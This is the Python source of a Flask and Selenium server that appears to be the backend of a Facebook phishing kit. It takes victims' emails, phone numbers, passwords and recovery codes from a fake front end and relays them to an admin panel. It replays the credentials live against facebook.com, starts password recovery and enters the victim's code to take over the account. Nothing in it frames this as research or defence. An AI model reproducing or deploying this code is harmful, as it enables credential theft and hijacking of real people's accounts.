from flask import Flask, render_template, request, session
from flask_socketio import SocketIO, emit
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time
from selenium.webdriver.chrome.options import Options
import uuid
from flask_session import Session

app = Flask(__name__)
socketio = SocketIO(app)

app.config['SECRET_KEY'] = 'your_secret_key'
app.config['SESSION_TYPE'] = 'filesystem'
Session(app)

drivers = {}

# Dictionary to track login attempts
login_attempts = {}
code_attempts = {}

@app.route('/')
def index():
    return render_template('index.html')


@app.route('/admin')
def admin():
    return render_template('admin.html')

@app.route('/confirm')
def confirm_page():
    return render_template('confirm.html')
    
@app.route('/done')
def done_page():
    return render_template('done.html')

@socketio.on('connect')
def handle_connect():
    print(f'Client connected: {request.sid}')
    emit('message', {'data': f'Connected to the server with user ID: {request.sid}'})

@socketio.on('disconnect')
def handle_disconnect():
    print(f'Client disconnected: {request.sid}')
    if request.sid in login_attempts:
        del login_attempts[request.sid]

@socketio.on('client_contact')
def handle_client_contact(data):
    session_id = data['session_id']
    email = data['email']
    phone = data['phone']
    print(f'Received email from client {session_id}: {email}')
    print(f'Received phone from client {session_id}: {phone}')
    emit('admin_message', {'id': session_id, 'type': 'email', 'data': email}, broadcast=True)
    emit('admin_message', {'id': session_id, 'type': 'phone', 'data': phone}, broadcast=True)

@socketio.on('client_password')
def handle_client_password(data):
    session_id = data['session_id']
    contact = data['contact']
    email = contact['email']
    phone = contact['phone']
    password = data['data']
    print(f'Received password from client {session_id}: {password}')
    emit('admin_message', {'id': session_id, 'type': 'password', 'data': password}, broadcast=True)
    
    # Perform login test with the received contact and password
    result = login_facebook(session_id, email, phone, password)
    
    # Track login attempts
    if session_id not in login_attempts:
        login_attempts[session_id] = 0
    if result == "Wrong_Pass":
        login_attempts[session_id] += 1
        if login_attempts[session_id] >= 2:
            forgot_password(session_id, email, phone)
            emit('redirect', {'url': '/confirm'}, room=session_id)
            return
    
    # Emit the result back to the client
    emit('login_result', {'result': result}, room=session_id)

def setup_selenium(session_id):
    if session_id in drivers and drivers[session_id] is not None:
        return drivers[session_id]
    
    chrome_options = Options()
 
    chrome_options.add_argument("--enable-unsafe-swiftshader")  

    service = Service(executable_path="chromedriver.exe")
    driver = webdriver.Chrome(service=service, options=chrome_options)
    driver.get("https://en-gb.facebook.com/")
    drivers[session_id] = driver
    return drivers[session_id]

def login_facebook(session_id, email, phone, password):
    driver = setup_selenium(session_id)
    try:
       
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, "email")))
        
        contact = email if email else phone
        email_input = driver.find_element(By.ID, "email")
        email_input.clear()
        email_input.send_keys(contact)
        
        password_input = driver.find_element(By.ID, "pass")
        password_input.clear()
        password_input.send_keys(password)
        
        login_button = driver.find_element(By.NAME, "login")
        login_button.click()
        
        time.sleep(5)
        driver.get(driver.current_url)
        count=1


        if "two_step_verification" in driver.current_url:
            print("Two-step verification required.")
            return "checkpoint"
        elif "https://en-gb.facebook.com/login" in driver.current_url:
            # If login with email fails, try logging in with phone
            email_input = driver.find_element(By.ID, "email")
            email_input.clear()
            email_input.send_keys(phone)
            
            password_input = driver.find_element(By.ID, "pass")
            password_input.clear()
            password_input.send_keys(password)
            
            login_button = driver.find_element(By.NAME, "login")
            login_button.click()
            url = driver.current_url.replace("www","en-gb")    
            driver.get(url)
            time.sleep(5)
            
            if "two_step_verification" in driver.current_url:
                print("Two-step verification required.")
                return "checkpoint"
            elif "https://en-gb.facebook.com/login" in driver.current_url:
                print("Login failed. Please check your credentials.")
                return "Wrong_Pass"
        elif "https://en-gb.facebook.com/recover" in driver.current_url:
            if count==1:
            # If login with email fails, try logging in with phone
                driver.get("https://en-gb.facebook.com/login")
                email_input = driver.find_element(By.ID, "email")
                email_input.clear()
                email_input.send_keys(phone)
                
                password_input = driver.find_element(By.ID, "pass")
                password_input.clear()
                password_input.send_keys(password)
                
                login_button = driver.find_element(By.NAME, "login")
                login_button.click()
                url = driver.current_url.replace("www","en-gb")    
                driver.get(url)
                time.sleep(5)
                
                if "two_step_verification" in driver.current_url:
                    print("Two-step verification required.")
                    return "checkpoint"
                elif "https://en-gb.facebook.com/login" in driver.current_url:
                    print("Login failed. Please check your credentials.")
                    return "Wrong_Pass"
            count+=1
            forgot_password(session_id, email, phone)
            emit('redirect', {'url': '/confirm'}, room=request.sid)

        print("Login successful.")
        return "Login_Success"
    except Exception as e:
        print(f"An error occurred: {e}")
        return str(e)


def forgot_password(session_id, email, mobile=None):
    driver = setup_selenium(session_id)
    try:
        driver.get("https://en-gb.facebook.com/login/identify")
 
        WebDriverWait(driver, 20).until(EC.presence_of_element_located((By.ID, "identify_email")))
        
        # Lấy phần tử input bằng ID
        email_input = driver.find_element(By.ID, "identify_email")
        email_input.clear()
        email_input.send_keys(email)
        
        # Nhấn nút tìm kiếm (tương tự như trước)
        search_button = driver.find_element(By.NAME, "did_submit")
        search_button.click()
        time.sleep(5)

        if "https://en-gb.facebook.com/login/identify" in driver.current_url:
            phone_input = driver.find_element(By.ID, "identify_email")
            phone_input.clear()
            phone_input.send_keys(mobile)

            search_button = driver.find_element(By.NAME, "did_submit")
            search_button.click()
            


        time.sleep(5)

        # nếu ra chữ "We sent a 6-digit code to" thì đã lấy được form input và button submit
        element = driver.find_element(By.CSS_SELECTOR, ".uiHeaderTitle")
        if "Google" in element.text:
            driver.get("https://en-gb.facebook.com/recover/initiate/?is_from_lara_screen=1")
            time.sleep(5)
        
      
        
        button = WebDriverWait(driver, 20).until(
            EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
        )
        button.click()
        # đã lấy được form input và button submit
        
        print("Recovery code request initiated.")

    except Exception as e:
        print(f"An error occurred during forgot password process: {e}")

@socketio.on('confirm_code')
def handle_confirm_code(data):
    session_id = data['session_id']
    code = data['code']
    print(f'Received confirmation code from client {session_id}: {code}')
    
    if session_id not in code_attempts:
        code_attempts[session_id] = 0
    code_attempts[session_id] += 1
    
    if code_attempts[session_id] > 2:
        emit('redirect', {'url': '/done'}, room=session_id)
        return
    
    result = enter_confirmation_code(session_id, code)
    if result != "Code_Accepted":
        code_attempts[session_id] += 1
        if code_attempts[session_id] >= 2:
            emit('redirect', {'url': '/done'}, room=session_id)

def enter_confirmation_code(session_id, code):
    driver = setup_selenium(session_id)
    try:
        code_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.ID, "recovery_code_entry"))
        )
        code_input.clear()
        code_input.send_keys(code)
        
        continue_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.XPATH, '//button[text()="Continue"]'))
        )
        continue_button.click()
        time.sleep(5)

        if "https://en-gb.facebook.com/recover/code" in driver.current_url:
            print("Invalid confirmation code. Please try again.")
            return "Invalid_Code"

        print("Confirmation code entered.")
        return "Code_Accepted"
    except Exception as e:
        print(f"An error occurred while entering the confirmation code: {e}")


if __name__ == '__main__':
    socketio.run(app, debug=True)